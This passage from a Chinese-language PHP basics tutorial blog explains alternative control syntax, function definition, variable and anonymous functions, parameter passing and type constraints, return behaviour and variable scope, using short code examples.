<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">for($i=1;$i&lt;=10;$i++):</span><br><span class="line">	if($i%2==0):</span><br><span class="line">?&gt;</span><br><span class="line">    </span><br><span class="line">  			&lt;?php echo $i;?&gt;:锄禾日当午&lt;br&gt;  </span><br><span class="line">    </span><br><span class="line">&lt;?php</span><br><span class="line">	endif;</span><br><span class="line">endfor;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//运行结果</span><br><span class="line">2:锄禾日当午</span><br><span class="line">4:锄禾日当午</span><br><span class="line">6:锄禾日当午</span><br><span class="line">8:锄禾日当午</span><br><span class="line">10:锄禾日当午</span><br></pre></td></tr></table></figure>





<p>小结：可以通过替代语法证明else if之间如果有空格是嵌套if语句。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$score</span>=<span class="number">80</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$score</span>&gt;=<span class="number">90</span>):</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="variable">$score</span>&gt;=<span class="number">80</span>):    <span class="comment">//elseif之间没有空格，如果有空格是嵌套if语句</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;B&#x27;</span>;</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;C&#x27;</span>;</span><br><span class="line"><span class="keyword">endif</span>;</span><br><span class="line"></span><br><span class="line">----------------------------------------</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$score</span>=<span class="number">80</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$score</span>&gt;=<span class="number">90</span>):</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$score</span>&gt;=<span class="number">80</span>):</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;B&#x27;</span>;</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;C&#x27;</span>;</span><br><span class="line">	<span class="keyword">endif</span>;</span><br><span class="line"><span class="keyword">endif</span>;</span><br></pre></td></tr></table></figure>



<h2 id="1-5-函数"><a href="#1-5-函数" class="headerlink" title="1.5  函数"></a>1.5  函数</h2><p>1、函数就是一段代码块</p>
<p>2、函数可以实现模块化编程</p>
<h4 id="1-5-1-函数定义"><a href="#1-5-1-函数定义" class="headerlink" title="1.5.1  函数定义"></a>1.5.1  函数定义</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> 函数名(<span class="params">参数<span class="number">1</span>，参数<span class="number">2</span>，...</span>)</span>&#123;</span><br><span class="line">    <span class="comment">//函数体</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>通过函数名()调用函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//定义函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;锄禾日当午&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//调用</span></span><br><span class="line"><span class="title function_ invoke__">show</span>();		<span class="comment">//锄禾日当午</span></span><br><span class="line"><span class="title function_ invoke__">Show</span>();		<span class="comment">//锄禾日当午  函数名不区分大小写</span></span><br></pre></td></tr></table></figure>

<p>小结：</p>
<p>1、变量名区分大小写</p>
<p>2、关键字、函数名不区分大小写</p>
<h4 id="1-5-2-可变函数"><a href="#1-5-2-可变函数" class="headerlink" title="1.5.2  可变函数"></a>1.5.2  可变函数</h4><p>将函数名存储到变量中  </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"><span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$args</span>,<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;show&#x27;</span>;	<span class="comment">//将函数名保存到变量中</span></span><br><span class="line"><span class="variable">$str</span>(<span class="string">&#x27;锄禾日当午&#x27;</span>);</span><br></pre></td></tr></table></figure>





<p>例题：随机调用函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="comment">//中文显示</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showChinese</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;锄禾日当午&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//英文显示</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showEnglish</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;chu he re dang wu&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//测试	0(false),1(true)</span></span><br><span class="line"><span class="variable">$fun</span>=<span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="number">10</span>)%<span class="number">2</span>?<span class="string">&#x27;showChinese&#x27;</span>:<span class="string">&#x27;showEnglish&#x27;</span>;   <span class="comment">//可变变量</span></span><br><span class="line"><span class="variable">$fun</span>();		<span class="comment">//  showChinese();/showEnglish()</span></span><br></pre></td></tr></table></figure>



<h4 id="1-5-3-匿名函数"><a href="#1-5-3-匿名函数" class="headerlink" title="1.5.3 匿名函数"></a>1.5.3 匿名函数</h4><p>匿名函数就是没有名字的函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//匿名函数</span></span><br><span class="line"><span class="variable">$fun</span>=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;锄禾日当午&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//匿名函数调用</span></span><br><span class="line"><span class="variable">$fun</span>();</span><br></pre></td></tr></table></figure>



<h4 id="1-5-4-参数传递"><a href="#1-5-4-参数传递" class="headerlink" title="1.5.4  参数传递"></a>1.5.4  参数传递</h4><p>函数的参数有形式参数和实际参数</p>
<p>形式参数是定义函数时候的参数，只起形式的作用，没有具体的值</p>
<p>实际参数的调用函数时候的参数，有具体的值</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"><span class="variable">$num1</span>,<span class="variable">$num2</span></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$num1</span>+<span class="variable">$num2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fun</span>(<span class="number">10</span>,<span class="number">20</span>);		<span class="comment">//30</span></span><br></pre></td></tr></table></figure>



<p>默认情况下，参数的传递是值传递</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$num</span>=<span class="number">10</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"><span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">	<span class="variable">$args</span>=<span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fun</span>(<span class="variable">$num</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$num</span>;		<span class="comment">//10</span></span><br></pre></td></tr></table></figure>

<p>地址传递</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$num</span>=<span class="number">10</span>;</span><br><span class="line"><span class="comment">//地址传递</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params">&amp;<span class="variable">$args</span></span>) </span>&#123;   <span class="comment">//&amp;符表示取地址</span></span><br><span class="line">	<span class="variable">$args</span>=<span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fun</span>(<span class="variable">$num</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$num</span>;		<span class="comment">//100</span></span><br></pre></td></tr></table></figure>

<p>小结</p>
<p>1、函数的参数默认是值传递</p>
<p>2、如果要传递地址，在参数前面加&amp;</p>
<p>3、如果是地址传递，不能直接写值</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params">&amp;<span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">	<span class="variable">$args</span>=<span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fun</span>(<span class="number">10</span>);   <span class="comment">//Fatal error: Only variables can be passed by reference (只有变量才能传递引用)</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="1-5-5-参数默认值"><a href="#1-5-5-参数默认值" class="headerlink" title="1.5.5  参数默认值"></a>1.5.5  参数默认值</h4><p>1、在定义函数的时候给形参赋值就是参数的默认值</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//参数的默认值</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$add</span>=<span class="string">&#x27;地址不详&#x27;</span></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;姓名：&#x27;</span>.<span class="variable">$name</span>,<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;地址：&#x27;</span>.<span class="variable">$add</span>,<span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//测试</span></span><br><span class="line"><span class="title function_ invoke__">fun</span>(<span class="string">&#x27;tom&#x27;</span>,<span class="string">&#x27;北京&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fun</span>(<span class="string">&#x27;berry&#x27;</span>);</span><br></pre></td></tr></table></figure>



<p>2、默认值必须是值，不能用变量代替</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;地址不详&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$add</span>=<span class="variable">$str</span></span>) </span>&#123;   <span class="comment">//错误，默认值可以使用变量</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;姓名：&#x27;</span>.<span class="variable">$name</span>,<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;地址：&#x27;</span>.<span class="variable">$add</span>,<span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>3、默认值可以使用常量</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;ADD&#x27;</span>,<span class="string">&#x27;地址不详&#x27;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$add</span>=ADD</span>) </span>&#123;    <span class="comment">//默认值可以使用常量</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;姓名：&#x27;</span>.<span class="variable">$name</span>,<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;地址：&#x27;</span>.<span class="variable">$add</span>,<span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//测试</span></span><br><span class="line"><span class="title function_ invoke__">fun</span>(<span class="string">&#x27;berry&#x27;</span>);</span><br></pre></td></tr></table></figure>



<p>4、有默认值的写在后面，没有默认值的写在前面</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//没有默认值的写在前面，有默认值写在后面</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$age</span>=<span class="string">&#x27;未知&#x27;</span>,<span class="variable">$add</span>=<span class="string">&#x27;地址不详&#x27;</span></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;姓名：<span class="subst">&#123;$name&#125;</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;年龄：<span class="subst">&#123;$age&#125;</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;地址：<span class="subst">&#123;$add&#125;</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fun</span>(<span class="string">&#x27;tom&#x27;</span>);</span><br><span class="line"><span class="comment">//运行结果</span></span><br><span class="line">姓名：tom</span><br><span class="line">年龄：未知</span><br><span class="line">地址：地址不详</span><br></pre></td></tr></table></figure>



<h4 id="1-5-6-参数个数不匹配"><a href="#1-5-6-参数个数不匹配" class="headerlink" title="1.5.6  参数个数不匹配"></a>1.5.6  参数个数不匹配</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"><span class="variable">$num1</span>,<span class="variable">$num2</span></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$num1</span>,<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$num2</span>,<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fun</span>(<span class="number">10</span>);	<span class="comment">//实参少于形参（报错）</span></span><br><span class="line"><span class="title function_ invoke__">fun</span>(<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>); <span class="comment">//实参多于形参，只取前面对应的值</span></span><br></pre></td></tr></table></figure>

<p>获取所有传递的参数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="comment">//echo func_num_args(),&#x27;&lt;br&gt;&#x27;;	//获取参数的个数</span></span><br><span class="line">	<span class="variable">$args</span>=<span class="title function_ invoke__">func_get_args</span>();	<span class="comment">//获取参数数组</span></span><br><span class="line">	<span class="title function_ invoke__">print_r</span>(<span class="variable">$args</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fun</span>(<span class="number">10</span>);</span><br><span class="line"><span class="title function_ invoke__">fun</span>(<span class="number">10</span>,<span class="number">20</span>);</span><br><span class="line"><span class="title function_ invoke__">fun</span>(<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>); </span><br></pre></td></tr></table></figure>



<h4 id="1-5-7-参数约束"><a href="#1-5-7-参数约束" class="headerlink" title="1.5.7  参数约束"></a>1.5.7  参数约束</h4><p>1、定义变长参数（了解）   &#x2F;&#x2F;注意用5.6及以上的版本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// ...$hobby包含了除了前面两个参数以外的所有参数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$age</span>,...<span class="variable">$hobby</span></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;姓名：&#x27;</span>.<span class="variable">$name</span>,<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;年龄：&#x27;</span>.<span class="variable">$age</span>,<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">	<span class="title function_ invoke__">print_r</span>(<span class="variable">$hobby</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fun</span>(<span class="string">&#x27;tom&#x27;</span>,<span class="number">22</span>);</span><br><span class="line"><span class="title function_ invoke__">fun</span>(<span class="string">&#x27;berry&#x27;</span>,<span class="number">25</span>,<span class="string">&#x27;读书&#x27;</span>,<span class="string">&#x27;睡觉&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<p>多学一招：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$num</span>=[<span class="number">10</span>,<span class="number">20</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params">...<span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">	<span class="title function_ invoke__">print_r</span>(<span class="variable">$args</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">fun</span>(...<span class="variable">$num</span>);   <span class="comment">//将数组中的参数展开</span></span><br><span class="line"><span class="comment">//运行结果</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Array</span></span><br><span class="line"><span class="comment">(</span></span><br><span class="line"><span class="comment">    [0] =&gt; 10</span></span><br><span class="line"><span class="comment">    [1] =&gt; 20</span></span><br><span class="line"><span class="comment">)</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>



<p>2、参数类型约束	（基本类型）int	float	string	bool  	（复合类型）1.数组（arry）  2.对象</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//类型约束</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span>,<span class="keyword">int</span> <span class="variable">$age</span></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;姓名：<span class="subst">&#123;$name&#125;</span>,&#x27;&lt;br&gt;&#x27;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;年龄：<span class="subst">&#123;$age&#125;</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fun</span>(<span class="string">&#x27;tom&#x27;</span>,<span class="number">22</span>);</span><br><span class="line"><span class="comment">//约束$name是字符串型，$age是整型</span></span><br></pre></td></tr></table></figure>



<p>3、返回值约束</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"><span class="keyword">int</span> <span class="variable">$num1</span>,<span class="keyword">int</span> <span class="variable">$num2</span></span>):<span class="title">int</span> </span>&#123;  <span class="comment">//必须返回整型</span></span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$num1</span>+<span class="variable">$num2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">fun</span>(<span class="number">10</span>,<span class="number">20</span>);		<span class="comment">//30</span></span><br></pre></td></tr></table></figure>

<p>可以约束：string、int、float、bool、数组</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//约束返回类型是数组</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"></span>):<span class="title">array</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//约束return后面不能有返回值  必须在7.1以后的版本中才支持</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"></span>):<span class="title">void</span> </span>&#123;    <span class="comment">//void是空的意思</span></span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fun</span>();</span><br></pre></td></tr></table></figure>



<h2 id="1-6-return"><a href="#1-6-return" class="headerlink" title="1.6  return"></a>1.6  return</h2><h4 id="1-6-1-终止脚本执行"><a href="#1-6-1-终止脚本执行" class="headerlink" title="1.6.1  终止脚本执行"></a>1.6.1  终止脚本执行</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;锄禾日当午&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span>;					<span class="comment">//终止脚本执行</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;汗滴禾下土&lt;br&gt;&#x27;</span>;	<span class="comment">//不执行</span></span><br></pre></td></tr></table></figure>

<p>提醒：return只能中断当前页面，如果有包含文件，只能中断包含文件</p>
<p>例题：</p>
<p>6-demo.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;锄禾日当午&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;./test.php&#x27;</span>;    <span class="comment">//包含文件</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;汗滴禾下土&lt;br&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>test.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;aaa&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span>;   <span class="comment">//只能中断test.php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;bbb&lt;br&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<p>如果要完全终止脚本执行，使用exit()、或die()</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;aaa&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">exit</span>();  <span class="comment">//die()</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;bbb&lt;br&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>



<h4 id="1-6-2、返回页面结果"><a href="#1-6-2、返回页面结果" class="headerlink" title="1.6.2、返回页面结果"></a>1.6.2、返回页面结果</h4><p>test.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;tom&#x27;</span>,<span class="string">&#x27;sex&#x27;</span>=&gt;<span class="string">&#x27;男&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>6-demo.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$stu</span>=<span class="keyword">require</span> <span class="string">&#x27;./test.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$stu</span>);  <span class="comment">//Array ( [name] =&gt; tom [sex] =&gt; 男 ) </span></span><br></pre></td></tr></table></figure>

<p>小结：在项目中引入配置文件就使用这种方法</p>
<h4 id="1-6-3-函数的返回和终止"><a href="#1-6-3-函数的返回和终止" class="headerlink" title="1.6.3 函数的返回和终止"></a>1.6.3 函数的返回和终止</h4><p>return在函数中使用作用有二<br>1、终止函数执行</p>
<p>​	</p>
<p>2、返回值</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line">	<span class="keyword">return</span> ;		<span class="comment">//终止函数执行</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;bbb&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fun</span>();   <span class="comment">//aaa</span></span><br><span class="line">----------------------------------</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&#x27;aaa&#x27;</span>;	<span class="comment">//返回值</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;aaa&#x27;</span>;		<span class="comment">//10</span></span><br></pre></td></tr></table></figure>













]]></content>
  </entry>
  <entry>
    <title>PHP开发基础4</title>
    <url>/2023/04/20/PHP%E5%BC%80%E5%8F%91%E5%9F%BA%E7%A1%804/</url>
    <content><![CDATA[<h2 id="1-2-作用域"><a href="#1-2-作用域" class="headerlink" title="1.2  作用域"></a>1.2  作用域</h2><h4 id="1-2-1-变量作用域"><a href="#1-2-1-变量作用域" class="headerlink" title="1.2.1 变量作用域"></a>1.2.1 变量作用域</h4><p>0、超全局变量：可以在函数内部和函数外部访问</p>
<p>1、全局变量：在函数外面</p>
<p>2、局部变量：在函数里面，默认情况下，函数内部是不会去访问函数外部的变量</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$num</span>=<span class="number">10</span>;   </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$num</span>;     <span class="comment">//Notice: Undefined variable: num  </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fun</span>();</span><br><span class="line"><span class="comment">//函数内部默认不能访问函数外部的值</span></span><br><span class="line">---------------------</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]=<span class="number">10</span>;   <span class="comment">//将值付给超全局变量</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>];    <span class="comment">//获取超全局的值   10</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fun</span>();</span><br><span class="line">----------------------------</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]=<span class="number">10</span>;  <span class="comment">//将值付给超全局变量</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fun</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];  <span class="comment">//打印超全局变量的值  10</span></span><br></pre></td></tr></table></figure>



<p>在函数内部访问全局变量</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$num</span>=<span class="number">10</span>;  <span class="comment">//全局变量</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$GLOBALS</span>[<span class="string">&#x27;num&#x27;</span>];	<span class="comment">//输出全局的$num</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fun</span>();</span><br></pre></td></tr></table></figure>

<p>练习：如下代码输出什么</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="variable">$GLOBALS</span>[<span class="string">&#x27;num&#x27;</span>]=<span class="number">10</span>;  <span class="comment">//将值付给全局的$num</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fun</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$num</span>;   <span class="comment">//10</span></span><br></pre></td></tr></table></figure>



<p>global关键字</p>
